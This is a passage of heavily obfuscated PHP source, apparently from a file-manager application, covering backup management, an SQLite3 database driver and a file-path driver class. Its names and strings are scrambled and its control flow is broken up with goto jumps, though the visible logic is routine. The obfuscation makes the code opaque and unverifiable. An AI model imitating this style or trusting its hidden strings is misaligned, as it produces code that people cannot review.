initData($dÆ‡÷š¶Ê = 0, $bíÅ®‚×äò = '') { goto Bšƒ•–¤ÅÂ; eƒ—ë÷ŞÔ‘: $this->checkStore($B•‡ÅÙ‰„Ñ[$e¸¶éÁƒ[705]]); $Aˆ«—Ââ÷ = array($e¸¶éÁƒ[705] => $B•‡ÅÙ‰„Ñ[$e¸¶éÁƒ[705]], $e¸¶éÁƒ[28] => self::$name, $e¸¶éÁƒ[703] => 0, $e¸¶éÁƒ[706] => $B•‡ÅÙ‰„Ñ[$e¸¶éÁƒ[706]], $e¸¶éÁƒ[296] => array($e¸¶éÁƒ[707] => array($e¸¶éÁƒ[703] => 0), $e¸¶éÁƒ[708] => array($e¸¶éÁƒ[703] => 0, $e¸¶éÁƒ[709] => 0, $e¸¶éÁƒ[710] => 0, $e¸¶éÁƒ[29] => $e¸¶éÁƒ[33]), $e¸¶éÁƒ[711] => array($e¸¶éÁƒ[703] => 0, $e¸¶éÁƒ[709] => 0, $e¸¶éÁƒ[710] => 0), $e¸¶éÁƒ[181] => array($e¸¶éÁƒ[703] => 0, $e¸¶éÁƒ[712] => 0, $e¸¶éÁƒ[713] => 0, $e¸¶éÁƒ[714] => 0, $e¸¶éÁƒ[715] => 0, $e¸¶éÁƒ[444] => $dÆ‡÷š¶Ê)), $e¸¶éÁƒ[716] => time(), $e¸¶éÁƒ[473] => 0); $DÙ„Ò‰‹” = Model($e¸¶éÁƒ[702])->insert($Aˆ«—Ââ÷); goto A¬Š»ìÍ‹; Bšƒ•–¤ÅÂ: $e¸¶éÁƒ =& $_SERVER[¢Í]; $B•‡ÅÙ‰„Ñ = Model($e¸¶éÁƒ[702])->config(); if ($bíÅ®‚×äò && $B•‡ÅÙ‰„Ñ[$e¸¶éÁƒ[705]] != $bíÅ®‚×äò) { $dÆ‡÷š¶Ê = 0; } goto eƒ—ë÷ŞÔ‘; A¬Š»ìÍ‹: $Aˆ«—Ââ÷[$e¸¶éÁƒ[392]] = $DÙ„Ò‰‹”; return $Aˆ«—Ââ÷; goto c§™ÃŸŠîè; c§™ÃŸŠîè: } private function checkStore($fÇÏï²©) { $e”ØÓÄ“¢Ô =& $_SERVER[¢Í]; $AÆÚòç¤áŠ = Model($e”ØÓÄ“¢Ô[717])->listData($fÇÏï²©); Model($e”ØÓÄ“¢Ô[717])->checkConfig($AÆÚòç¤áŠ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¢Í][702])->findByName(self::$name); } return self::$option; } public static function set($bÍ»ò©šš¿) { $aÑÇ¹‘÷Àê =& $_SERVER[¢Í]; $CàÄİì— = self::get(); foreach ($bÍ»ò©šš¿ as $b£ª©ğ° => $F¬™¦éğÂ…) { $AĞ…Ùçöó¯ = explode($aÑÇ¹‘÷Àê[101], $b£ª©ğ°); $d¢ÑŸ¤–Â = count($AĞ…Ùçöó¯); switch ($d¢ÑŸ¤–Â) { case 1: $CàÄİì—[$AĞ…Ùçöó¯[0]] = $F¬™¦éğÂ…; break; case 2: $CàÄİì—[$AĞ…Ùçöó¯[0]][$AĞ…Ùçöó¯[1]] = $F¬™¦éğÂ…; break; case 3: $CàÄİì—[$AĞ…Ùçöó¯[0]][$AĞ…Ùçöó¯[1]][$AĞ…Ùçöó¯[2]] = $F¬™¦éğÂ…; break; } } Model($aÑÇ¹‘÷Àê[702])->update($CàÄİì—[$aÑÇ¹‘÷Àê[392]], $CàÄİì—); self::$option = $CàÄİì—; return self::$option; } public function keep() { $E‹©«”˜ =& $_SERVER[¢Í]; $B‰ÂÑ™îªµ = self::get(); if ($B‰ÂÑ™îªµ[$E‹©«”˜[296]][$E‹©«”˜[707]][$E‹©«”˜[703]] == $E‹©«”˜[93]) { return; } $this->backupKeep($B‰ÂÑ™îªµ); self::set(array($E‹©«”˜[718] => 1)); } private function backupKeep($FÄŒ„³ğ÷„) { goto f™œ¼©’ÌÈ; bÎ Ïéâ´: for ($C™¡óäÛÓĞ = 0; $C™¡óäÛÓĞ < 12; $C™¡óäÛÓĞ++) { $bÌç…èÜÃæ[] = date($eµ¶œÒ½‰×[719], strtotime("\55{$C™¡óäÛÓĞ}\x20\x6d\157\156\x74\150\163")); } $bÌç…èÜÃæ = array_unique($bÌç…èÜÃæ); foreach ($FÌè©èãÅ as $bøÄ·Õ‡“È) { if (!empty($bøÄ·Õ‡“È[$eµ¶œÒ½‰×[28]]) && in_array($bøÄ·Õ‡“È[$eµ¶œÒ½‰×[28]], $bÌç…èÜÃæ)) { continue; } Model($eµ¶œÒ½‰×[702])->remove($bøÄ·Õ‡“È[$eµ¶œÒ½‰×[392]]); $e»ô§ÕÚ§Œ = "\x7b\151\157\72{$FÄŒ„³ğ÷„[$eµ¶œÒ½‰×[705]]}\x7d\57\x64\141\164\141\x62\141\163\x65\x2f\x62\x61\x63\x6b\x75\x70\137{$bøÄ·Õ‡“È[$eµ¶œÒ½‰×[28]]}"; IO::remove($e»ô§ÕÚ§Œ, !1); } goto Aò¡¾‰ÁÂ; f™œ¼©’ÌÈ: $eµ¶œÒ½‰× =& $_SERVER[¢Í]; $FÌè©èãÅ = Model($eµ¶œÒ½‰×[702])->listData(); if (empty($FÌè©èãÅ)) { return; } goto a¥—óĞ§ ; a¥—óĞ§ : $C™¡óäÛÓĞ = 0; $bÌç…èÜÃæ = array(); foreach ($FÌè©èãÅ as $bøÄ·Õ‡“È) { if ($C™¡óäÛÓĞ >= 7) { break; } $bÌç…èÜÃæ[] = $bøÄ·Õ‡“È[$eµ¶œÒ½‰×[28]]; $C™¡óäÛÓĞ++; } goto bÎ Ïéâ´; Aò¡¾‰ÁÂ: } public function db() { goto f«À¥§µ; eí”¯òƒ›: $a–îôÚ×“ø = new BackupDb(); if (!$a–îôÚ×“ø->index()) { return !1; } self::set(array($DßŒ›ªÛÚ[720] => 1)); goto D¦µ‡óÊ“ô; f«À¥§µ: $DßŒ›ªÛÚ =& $_SERVER[¢Í]; $E‡Ï®ÃÎĞ¶ = self::get(); if ($E‡Ï®ÃÎĞ¶[$DßŒ›ªÛÚ[296]][$DßŒ›ªÛÚ[708]][$DßŒ›ªÛÚ[703]] == $DßŒ›ªÛÚ[93]) { return !0; } goto eí”¯òƒ›; D¦µ‡óÊ“ô: return !0; goto eêòÛÚÊ§; eêòÛÚÊ§: } public function dbFile() { goto bÔ‡¬ÖÊ¶¶; FÏõáá°ÆÉ: $AÈ­ˆĞ¤òŞ = new BackupDbFile(); if (!$AÈ­ˆĞ¤òŞ->index()) { return !1; } self::set(array($ašëğË÷“Ô[721] => 1)); goto AïÄÂö®Ú; bÔ‡¬ÖÊ¶¶: $ašëğË÷“Ô =& $_SERVER[¢Í]; $cáñ‚ğ‚è = self::get(); if ($cáñ‚ğ‚è[$ašëğË÷“Ô[296]][$ašëğË÷“Ô[711]][$ašëğË÷“Ô[703]] == $ašëğË÷“Ô[93]) { return !0; } goto FÏõáá°ÆÉ; AïÄÂö®Ú: return !0; goto e¿¯µâ œÃ; e¿¯µâ œÃ: } public function file() { $e…çØ­ÉìĞ =& $_SERVER[¢Í]; $CË¶Î¦á˜  = self::get(); if ($CË¶Î¦á˜ [$e…çØ­ÉìĞ[296]][$e…çØ­ÉìĞ[181]][$e…çØ­ÉìĞ[703]] == $e…çØ­ÉìĞ[93]) { return !0; } if (!isset($CË¶Î¦á˜ [$e…çØ­ÉìĞ[706]]) || $CË¶Î¦á˜ [$e…çØ­ÉìĞ[706]] == $e…çØ­ÉìĞ[494]) { $c”…Ê°íÙ = new BackupFile(); if (!$c”…Ê°íÙ->index()) { return !1; } } self::set(array($e…çØ­ÉìĞ[722] => 1, $e…çØ­ÉìĞ[703] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto a†Ş®ïª°ô; eöÉ¢Ÿ˜©„: $BÑ‘Ÿ¾É› = array_diff($BÑ‘Ÿ¾É›, array($e‚§»Äš£[724], $e‚§»Äš£[725])); foreach ($BÑ‘Ÿ¾É› as $e¬è÷Ğº©Ô) { $F¹‰Šªˆ += $C¯Â®ÉøË->model($e¬è÷Ğº©Ô)->count(); } $AÕ”ë²˜ºù = new Task($e‚§»Äš£[726], $e‚§»Äš£[727], $F¹‰Šªˆ, LNG($e‚§»Äš£[728]) . $e‚§»Äš£[729] . LNG($e‚§»Äš£[730])); goto f‘¶ø»ğØÃ; f‘¶ø»ğØÃ: foreach ($BÑ‘Ÿ¾É› as $e¬è÷Ğº©Ô) { $F×†ÉªîÕ = $dâÆ¥…Œãœ . $e¬è÷Ğº©Ô . $e‚§»Äš£[731]; $CÈŸó”ì¤Ü = null; if ($e¬è÷Ğº©Ô == $e‚§»Äš£[732] && (!isset($CµñÈ£ôšã[$e‚§»Äš£[706]]) || $CµñÈ£ôšã[$e‚§»Äš£[706]] == $e‚§»Äš£[494])) { $CÈŸó”ì¤Ü = self::$io; } $eÙîñ©™„ += $C¯Â®ÉøË->sqlFromDb($e¬è÷Ğº©Ô, $F×†ÉªîÕ, $AÕ”ë²˜ºù, $CÈŸó”ì¤Ü); } $AÕ”ë²˜ºù->end(); $eŞÄªƒµ‹‰ = array($e‚§»Äš£[733] => $fÛäè„Áæ, $e‚§»Äš£[720] => 1, $e‚§»Äš£[734] => $F¹‰Šªˆ + 1, $e‚§»Äš£[735] => $eÙîñ©™„); goto e‚†‚¹ÒöÀ; F²”œ±²: $C¯Â®ÉøË = new DbManage($bğƒ¬¢òŒ, $fÛäè„Áæ); $dâÆ¥…Œãœ = TEMP_FILES . $e‚§»Äš£[723] . self::$name . $e‚§»Äš£[8]; del_dir($dâÆ¥…Œãœ); goto cÃñŸ¾ì‡¸; a†Ş®ïª°ô: $e‚§»Äš£ =& $_SERVER[¢Í]; $CµñÈ£ôšã = Backup::get(); self::$io = $CµñÈ£ôšã[$e‚§»Äš£[705]]; goto D‘ÕÁ£•æö; D‘ÕÁ£•æö: self::$name = $CµñÈ£ôšã[$e‚§»Äš£[28]]; $bğƒ¬¢òŒ = $GLOBALS[$e‚§»Äš£[6]][$e‚§»Äš£[17]]; $fÛäè„Áæ = $this->_dbType($bğƒ¬¢òŒ); goto F²”œ±²; cÃñŸ¾ì‡¸: mk_dir($dâÆ¥…Œãœ); $F¹‰Šªˆ = $eÙîñ©™„ = 0; try { $BÑ‘Ÿ¾É› = $C¯Â®ÉøË->db()->getTables(); } catch (Exception $DÀâó×¡È) { return !1; } goto eöÉ¢Ÿ˜©„; e‚†‚¹ÒöÀ: Backup::set($eŞÄªƒµ‹‰); if ($F¹‰Šªˆ > $eÙîñ©™„) { return !1; } return !0; goto d¥í¾½‡šœ; d¥í¾½‡šœ: } private function _dbType($Fá¢¼‰›¬²) { goto bÑÕìñãÜñ; c“ˆ÷êÊ: if ($cİ­à»Ğ¢§ == $e¥·ÁÀéø[737]) { $aˆ¬²Ûß÷ = explode($e¥·ÁÀéø[4], $Fá¢¼‰›¬²[$e¥·ÁÀéø[738]]); $cİ­à»Ğ¢§ = $aˆ¬²Ûß÷[0]; } $Aá±„Õ¸ù = array($e¥·ÁÀéø[739] => $e¥·ÁÀéø[9], $e¥·ÁÀéø[740] => $e¥·ÁÀéø[741]); if (isset($Aá±„Õ¸ù[$cİ­à»Ğ¢§])) { $cİ­à»Ğ¢§ = $Aá±„Õ¸ù[$cİ­à»Ğ¢§]; } goto dñî®¹ç„Ş; bÑÕìñãÜñ: $e¥·ÁÀéø =& $_SERVER[¢Í]; $Fá¢¼‰›¬² = array_change_key_case($Fá¢¼‰›¬²); $cİ­à»Ğ¢§ = $Fá¢¼‰›¬²[$e¥·ÁÀéø[736]]; goto c“ˆ÷êÊ; dñî®¹ç„Ş: return $cİ­à»Ğ¢§; goto FÚ³¾«ÕéÕ; FÚ³¾«ÕéÕ: } } goto B°Šˆæô™İ; Eœƒ‚ïˆ: class DbSqlite3Base extends Db { public function __construct($fÙõÌ÷©ã× = '') { $f„…˜’ê =& $_SERVER[¢Í]; if (!class_exists($f„…˜’ê[61])) { think_exception(think_lang($f„…˜’ê[10]) . $f„…˜’ê[62]); } if (!empty($fÙõÌ÷©ã×)) { if (!isset($fÙõÌ÷©ã×[$f„…˜’ê[12]])) { $fÙõÌ÷©ã×[$f„…˜’ê[12]] = 438; } $this->config = $fÙõÌ÷©ã×; if (empty($this->config[$f„…˜’ê[13]])) { $this->config[$f„…˜’ê[13]] = array(); } } } public function connect($B¥Ä‡çï÷Û = '', $Bˆá…µãö» = 0) { $c¼Ÿ—²Ù‰ =& $_SERVER[¢Í]; if (!isset($this->linkID[$Bˆá…µãö»])) { if (empty($B¥Ä‡çï÷Û)) { $B¥Ä‡çï÷Û = $this->config; } $this->linkID[$Bˆá…µãö»] = new SQLite3($B¥Ä‡çï÷Û[$c¼Ÿ—²Ù‰[17]]); if (!$this->linkID[$Bˆá…µãö»]) { think_exception($this->linkID[$Bˆá…µãö»]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$Bˆá…µãö»]->busyTimeout(30000); if (1 != think_config($c¼Ÿ—²Ù‰[18])) { unset($this->config); } } return $this->linkID[$Bˆá…µãö»]; } public function free() { $this->queryID = null; } public function query($c›£Æøã˜¦) { goto F©Ê¡†®; Dä‹ÓƒˆÇ›: if (!1 === $this->queryID) { $this->error(); return !1; } else { $C°›‹ç„˜¥ = $this->getAll(); $this->numRows = count($C°›‹ç„˜¥); return $C°›‹ç„˜¥; } goto cé¤’…ˆÔ; a¶ïäƒğ‘ˆ: $this->queryStr = $c›£Æøã˜¦; if ($this->queryID) { $this->free(); } think_action_status($Fâìåğ¥êê[19], 1); goto f…å¤ò¿Ÿƒ; F©Ê¡†®: $Fâìåğ¥êê =& $_SERVER[¢Í]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a¶ïäƒğ‘ˆ; f…å¤ò¿Ÿƒ: think_status($Fâìåğ¥êê[20]); $this->queryID = $this->_linkID->query($c›£Æøã˜¦); $this->debug(); goto Dä‹ÓƒˆÇ›; cé¤’…ˆÔ: } public function execute($cß†ãê”‹) { goto BÊö—’Ã¤á; e‹È¢„‡‚ç: $this->queryStr = $cß†ãê”‹; if ($this->queryID) { $this->free(); } think_action_status($DëƒºÈÎæ [21], 1); goto c•Œºö“‚; EÂí çéÜ: if (!1 === $d’ŠñÂ¶ÆÆ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto DØè¸Ü„ƒÕ; c•Œºö“‚: think_status($DëƒºÈÎæ [20]); $d’ŠñÂ¶ÆÆ = $this->_linkID->exec($cß†ãê”‹); $this->debug(); goto EÂí çéÜ; BÊö—’Ã¤á: $DëƒºÈÎæ  =& $_SERVER[¢Í]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e‹È¢„‡‚ç; DØè¸Ü„ƒÕ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¢Í][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bÍÇ±øÖà = $this->_linkID->query($_SERVER[¢Í][23]); if (!$bÍÇ±øÖà) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $bßÕ–Ó—¬ = $this->_linkID->query($_SERVER[¢Í][24]); if (!$bßÕ–Ó—¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $Fâãå°ôóÌ = array(); while ($Bïô„é´Ö† = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $Fâãå°ôóÌ[] = $Bïô„é´Ö†; } $this->queryID->reset(); return $Fâãå°ôóÌ; } public function getFields($f»íóº¼à) { $CÄ×å®È™® =& $_SERVER[¢Í]; $Fô÷òÎö = $this->query($CÄ×å®È™®[25] . $f»íóº¼à . $CÄ×å®È™®[26]); $Cë¹ºÈÖãç = array(); if ($Fô÷òÎö) { foreach ($Fô÷òÎö as $D¸¢—ãµ³ˆ => $dïÊš°ğšµ) { $Cë¹ºÈÖãç[$dïÊš°ğšµ[$CÄ×å®È™®[28]]] = array($CÄ×å®È™®[28] => $dïÊš°ğšµ[$CÄ×å®È™®[28]], $CÄ×å®È™®[29] => $dïÊš°ğšµ[$CÄ×å®È™®[29]], $CÄ×å®È™®[31] => (bool) ($dïÊš°ğšµ[$CÄ×å®È™®[31]] === $CÄ×å®È™®[33]), $CÄ×å®È™®[34] => $dïÊš°ğšµ[$CÄ×å®È™®[63]], $CÄ×å®È™®[36] => (bool) $dïÊš°ğšµ[$CÄ×å®È™®[64]], $CÄ×å®È™®[39] => (bool) $dïÊš°ğšµ[$CÄ×å®È™®[64]]); } } return $Cë¹ºÈÖãç; } public function getTables($eÑ¬¦µ¬°ï = '') { $bóŒ³ô¼Ãñ =& $_SERVER[¢Í]; $F°´Œ­¤öŒ = $this->query($bóŒ³ô¼Ãñ[42] . $bóŒ³ô¼Ãñ[43] . $bóŒ³ô¼Ãñ[44]); $Aœ™Ú§ÛÒ = array(); foreach ($F°´Œ­¤öŒ as $c´Ù²êì­ï => $d’¹Î©µ¾) { $Aœ™Ú§ÛÒ[$c´Ù²êì­ï] = current($d’¹Î©µ¾); } return $Aœ™Ú§ÛÒ; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $A†£Ô…ÇíÖ =& $_SERVER[¢Í]; $this->error = $this->_linkID->lastErrorMsg(); if ($A†£Ô…ÇíÖ[33] != $this->queryStr) { $this->error .= LNG($A†£Ô…ÇíÖ[45]) . $this->queryStr; } think_trace($this->error, $A†£Ô…ÇíÖ[33], $A†£Ô…ÇíÖ[46]); return $this->error; } public function escapeString($a¨¼îÕ¼™) { $DÍçÖ›Ñ­Ã =& $_SERVER[¢Í]; if ($this->_linkID) { return $this->_linkID->escapeString($a¨¼îÕ¼™); } return str_ireplace($DÍçÖ›Ñ­Ã[65], $DÍçÖ›Ñ­Ã[66], $a¨¼îÕ¼™); } public function parseLimit($c—´ê©ï†ó) { $FçĞÓµİ¹“ =& $_SERVER[¢Í]; $BÃš¤Í¼» = $FçĞÓµİ¹“[33]; if (!empty($c—´ê©ï†ó)) { $c—´ê©ï†ó = explode($FçĞÓµİ¹“[47], $c—´ê©ï†ó); if (count($c—´ê©ï†ó) > 1) { $BÃš¤Í¼» .= $FçĞÓµİ¹“[48] . $c—´ê©ï†ó[1] . $FçĞÓµİ¹“[49] . $c—´ê©ï†ó[0] . $FçĞÓµİ¹“[50]; } else { $BÃš¤Í¼» .= $FçĞÓµİ¹“[48] . $c—´ê©ï†ó[0] . $FçĞÓµİ¹“[50]; } } return $BÃš¤Í¼»; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $dŠ†É©ùœ” =& $_SERVER[¢Í]; $this->objectDriver = array($dŠ†É©ùœ”[67], $dŠ†É©ùœ”[68], $dŠ†É©ùœ”[69], $dŠ†É©ùœ”[70], $dŠ†É©ùœ”[71], $dŠ†É©ùœ”[72], $dŠ†É©ùœ”[73], $dŠ†É©ùœ”[74]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($dš÷…À‰÷§) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($dš÷…À‰÷§, $_SERVER[¢Í][8]); } return $dš÷…À‰÷§; } public function iconvApp($e¤è±Ğ‡„) { return $e¤è±Ğ‡„; } public function iconvSystem($a¬ÉĞİèŠ) { return $a¬ÉĞİèŠ; } public function iconvTo($eÁğ¦°Øº, $A— ·ºô‚ù, $CÀƒ®é™) { goto CÉ¸‚¤õ¼å; a¨—‰˜¶ó„: $f¤¤Î©Î¼ö = $A— ·ºô‚ù . $b¬§µ âÌË[76] . $CÀƒ®é™ . $b¬§µ âÌË[77] . $eÁğ¦°Øº; if (isset($A…÷¨òÕØÍ[$f¤¤Î©Î¼ö])) { return $A…÷¨òÕØÍ[$f¤¤Î©Î¼ö]; } if (function_exists($b¬§µ âÌË[78])) { $CåÀÂ•á–µ = @mb_convert_encoding($eÁğ¦°Øº, $CÀƒ®é™, $A— ·ºô‚ù); } else { $CåÀÂ•á–µ = @iconv($A— ·ºô‚ù, $CÀƒ®é™, $eÁğ¦°Øº); } goto FÛ¶‰Î¼Û˜; eóùİš²õù: return $CåÀÂ•á–µ; goto dÛÃŠïŸš; FÛ¶‰Î¼Û˜: $CåÀÂ•á–µ = $CåÀÂ•á–µ ? $CåÀÂ•á–µ : $eÁğ¦°Øº; if (strstr($CåÀÂ•á–µ, $b¬§µ âÌË[79])) { $CåÀÂ•á–µ = str_replace($b¬§µ âÌË[79], $b¬§µ âÌË[80], $CåÀÂ•á–µ); } $A…÷¨òÕØÍ[$A— ·ºô‚ù . $b¬§µ âÌË[76] . $CÀƒ®é™ . $b¬§µ âÌË[77] . $eÁğ¦°Øº] = $CåÀÂ•á–µ; goto dŞ¯Ó·ƒÁ”; CÉ¸‚¤õ¼å: $b¬§µ âÌË =& $_SERVER[¢Í]; if (!$eÁğ¦°Øº || !function_exists($b¬§µ âÌË[75])) { return $eÁğ¦°Øº; } static $A…÷¨òÕØÍ = array(); goto a¨—‰˜¶ó„; dŞ¯Ó·ƒÁ”: $A…÷¨òÕØÍ[$CÀƒ®é™ . $b¬§µ âÌË[76] . $A— ·ºô‚ù . $b¬§µ âÌË[77] . $eÁğ¦°Øº] = $eÁğ¦°Øº; $A…÷¨òÕØÍ[$CÀƒ®é™ . $b¬§µ âÌË[76] . $A— ·ºô‚ù . $b¬§µ âÌË[77] . $CåÀÂ•á–µ] = $eÁğ¦°Øº; $A…÷¨òÕØÍ[$A— ·ºô‚ù . $b¬§µ âÌË[76] . $CÀƒ®é™ . $b¬§µ âÌË[77] . $CåÀÂ•á–µ] = $CåÀÂ•á–µ; goto eóùİš²õù; dÛÃŠïŸš: } public function getPathInner($cÛù±ô³¾Ç) { $a÷ÉæºÁÏ¥ = IO::init($cÛù±ô³¾Ç); return $a÷ÉæºÁÏ¥->path; } public function getPathOuter($fÉÎèÒÄÁ‡) { $DÁ‰»–Ê‘¹ =& $_SERVER[¢Í]; $e™½˜³ÈõÒ = strlen(trim($this->pathBase, $DÁ‰»–Ê‘¹[8])); $fÉÎèÒÄÁ‡ = substr(trim($fÉÎèÒÄÁ‡, $DÁ‰»–Ê‘¹[8]), $e™½˜³ÈõÒ); return $this->pathDriver . $DÁ‰»–Ê‘¹[8] . ltrim($fÉÎèÒÄÁ‡, $DÁ‰»–Ê‘¹[8]); } public function isParentOf($bø‹Ô® ¾ç, $fÀå¬ÌÀğ) { $a‡Ô†Âåõ =& $_SERVER[¢Í]; $bø‹Ô® ¾ç = rtrim(strtolower($bø‹Ô® ¾ç), $a‡Ô†Âåõ[8]) . $a‡Ô†Âåõ[8]; $fÀå¬ÌÀğ = rtrim(strtolower($fÀå¬ÌÀğ), $a‡Ô†Âåõ[8]) . $a‡Ô†Âåõ[8]; $bËñ§–ê‘ = strpos($fÀå¬ÌÀğ, $bø‹Ô® ¾ç) === 0; return $bËñ§–ê‘; } public function getType() { $cĞ®£ÍŠñ¤ =& $_SERVER[¢Í]; $aÈ¦¿‰Åßá = str_replace($cĞ®£ÍŠñ¤[81], $cĞ®£ÍŠñ¤[33], get_class($this)); return strtolower($aÈ¦¿‰Åßá); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($dˆ‘øÉù , $EË‚·åø×Ù) { $cİ­·ø˜µ­ =& $_SERVER[¢Í]; $f‰‹£ĞŞ„Í = rtrim($dˆ‘øÉù , $cİ­·ø˜µ­[8]) . $cİ­·ø˜µ­[8] . $EË‚·åø×Ù; $F¿×ÎÆ®‰’ = $this->exist($f‰‹£ĞŞ„Í); return $F¿×ÎÆ®‰’ ? $f‰‹£ĞŞ„Í : !1; } public function setModifyTime($fãË°Ô‹Ê, $cØÎ÷Èº¢‹ = '') { } public function renameObject($cÎªĞê†êˆ, $DÈ‘×Øğñ­) { goto f¦Œ¯Ÿ¦ùˆ; fƒ‹¥®¸·Ä: $cÎªĞê†êˆ = $this->getPathOuter($cÎªĞê†êˆ); $DÈ‘×Øğñ­ = $this->pathFather($cÎªĞê†êˆ) . $DÈ‘×Øğñ­; if (IO::isFile($cÎªĞê†êˆ)) { $BõÔ„óœœÑ = IO::copy($cÎªĞê†êˆ, $this->pathFather($cÎªĞê†êˆ), REPEAT_RENAME_FOLDER, $fˆäêÒùá); if ($BõÔ„óœœÑ) { IO::remove($cÎªĞê†êˆ); } } else { $BõÔ„óœœÑ = IO::mkdir($DÈ‘×Øğñ­); if (!$BõÔ„óœœÑ) { return !1; } $fÃïø½‘Èä = IO::listPath($cÎªĞê†êˆ, !0); $c’Ÿ—™Ğˆ½ = array_merge($fÃïø½‘Èä[$bó§³›‰ñÖ[83]], $fÃïø½‘Èä[$bó§³›‰ñÖ[84]]); foreach ($c’Ÿ—™Ğˆ½ as $B’¥Ï‘›) { IO::move($B’¥Ï‘›[$bó§³›‰ñÖ[85]], $DÈ‘×Øğñ­, REPEAT_RENAME_FOLDER); } IO::remove($cÎªĞê†êˆ); } goto A£¨ˆ¢öÅ¯; f¦Œ¯Ÿ¦ùˆ: $bó§³›‰ñÖ =& $_SERVER[¢Í]; $fˆäêÒùá = $DÈ‘×Øğñ­; Hook::trigger($bó§³›‰ñÖ[82], $this, $cÎªĞê†êˆ, $this, $this->pathFather($cÎªĞê†êˆ) . $DÈ‘×Øğñ­); goto fƒ‹¥®¸·Ä; A£¨ˆ¢öÅ¯: return $BõÔ„óœœÑ ? $DÈ‘×Øğñ­ : !1; goto E¼ÙÒœ™½; E¼ÙÒœ™½: } public function tempFile($B±£¥ºæ§ = '', $EíÆ¹š¶ë = '') { goto a™£¤¬îÔ; a™£¤¬îÔ: if (!$B±£¥ºæ§) { $B±£¥ºæ§ = rand_string(15); } $a„Ì±ÔÁ¾ = TEMP_FILES . rand_string(15) . $_SERVER[¢Í][8]; @mkdir($a„Ì±ÔÁ¾, 511, !0); goto AÁ­æ…œ³¦; AÁ­æ…œ³¦: $aÙ²‹ÈÄ— = $a„Ì±ÔÁ¾ . $B±£¥ºæ§; @touch($aÙ²‹ÈÄ—); if ($EíÆ¹š¶ë) { file_put_contents($aÙ²‹ÈÄ—, $EíÆ¹š¶ë); } goto BŒÍŸ©‡; BŒÍŸ©‡: return $aÙ²‹ÈÄ—; goto EÉ¼›ß‚Æè; EÉ¼›ß‚Æè: } public function tempFileRemve($f¾îµ·ƒ‰) { @unlink($f¾îµ·ƒ‰); @rmdir($this->pathFather($f¾îµ·ƒ‰)); } public function mkfile($bôŠ»ß‘…, $DŒáÏÓƒ¼¡ = '', $A‘ôñ¬„® = REPEAT_RENAME) { } public function mkdir($eÖ¿ëˆ¢à, $FˆÇÔí‚¾© = REPEAT_SKIP) { } public function delFile($dëÅˆ¤àô…) { } public function delFolder($CÅ¬£·Á¨) { } public function copyFile($dé¹›ÛŒ¯, $e—‡…Û©šš) { } public function moveFile($eÖƒÕùÜ¦ó, $c²¸¥æ¸½) { } public function remove($EÆù‰ÕÍá) { if ($this->isFile($EÆù‰ÕÍá)) { return $this->delFile($EÆù‰ÕÍá); } return $this->delFolder($EÆù‰ÕÍá); } public function rename($DÈµÀ™‘ø¾, $AÅÖêï‰‘) { } public function exist($A¶È´ìëµå) { } public function findByHash($FÏ‚öå´ˆâ = '', $B¡éÄæÈ = '') { return !1; } public function isFile($Bë§´È­¹) { } public function isFolder($Bå¹ÃÑéƒõ) { } public function size($aõê©É‚âÒ) { } public function info($cÍÁÖÛòèí) { } public function infoSimple($c…¤³²ÊÅ) { return $this->info($c…¤³²ÊÅ); } public function infoAuth($D—åÁŸòô) { return $this->info($D—åÁŸòô); } public function infoFull($A’ãÒŞÍÚİ) { return $this->info($A’ãÒŞÍÚİ); } public function infoWithChildren($cøøª–™¯†) { $aˆìÎĞÍÍ¯ =& $_SERVER[¢Í]; static $BÂ´¼íƒß™ = array(); if (isset($BÂ´¼íƒß™[$cøøª–™¯†])) { return $BÂ´¼íƒß™[$cøøª–™¯†]; } $CÑÇÇ”çù = $this->info($cøøª–™¯†); if ($CÑÇÇ”çù && $CÑÇÇ”çù[$aˆìÎĞÍÍ¯[29]] == $aˆìÎĞÍÍ¯[86]) { $f¦áêºÏß = array($aˆìÎĞÍÍ¯[87] => 0, $aˆìÎĞÍÍ¯[88] => 0, $aˆìÎĞÍÍ¯[89] => 0); $this->infoChildren($cøøª–™¯†, $f¦áêºÏß); $CÑÇÇ”çù[$aˆìÎĞÍÍ¯[87]] = $f¦áêºÏß[$aˆìÎĞÍÍ¯[87]]; $CÑÇÇ”çù[$aˆìÎĞÍÍ¯[90]] = array($aˆìÎĞÍÍ¯[91] => $f¦áêºÏß[$aˆìÎĞÍÍ¯[88]], $aˆìÎĞÍÍ¯[92] => $f¦áêºÏß[$aˆìÎĞÍÍ¯[89]]); $BÂ´¼íƒß™[$cøøª–™¯†] = $CÑÇÇ”çù; } return $CÑÇÇ”çù; } public function listPath($Aœâ¾ö™™Š, $DöÃØõÚì“ = false) { } public function has($fÊªÛÚ ‚, $C½Ûä¨æ¦Œ = false, $AÃ¤ÌÌØµ = false) { } public function canRead($a–ÑªÇÍä) { } public function canWrite($béÀæì˜Ì) { } public function getContent($D´‹…ßÒŠÎ) { } public function setContent($cª¾Øâæ•Ö, $Bİ†¹ÉÅÂÙ = '') { } protected function infoChildren($D‡ª®½½Ë, &$B˜ß¨á’ß¨) { $EÃÀº®Ö =& $_SERVER[¢Í]; check_abort_echo(); $D°È¦Éòä = $this->listPath($D‡ª®½½Ë, !0); $D°È¦Éòä = array_merge($D°È¦Éòä[$EÃÀº®Ö[84]], $D°È¦Éòä[$EÃÀº®Ö[83]]); foreach 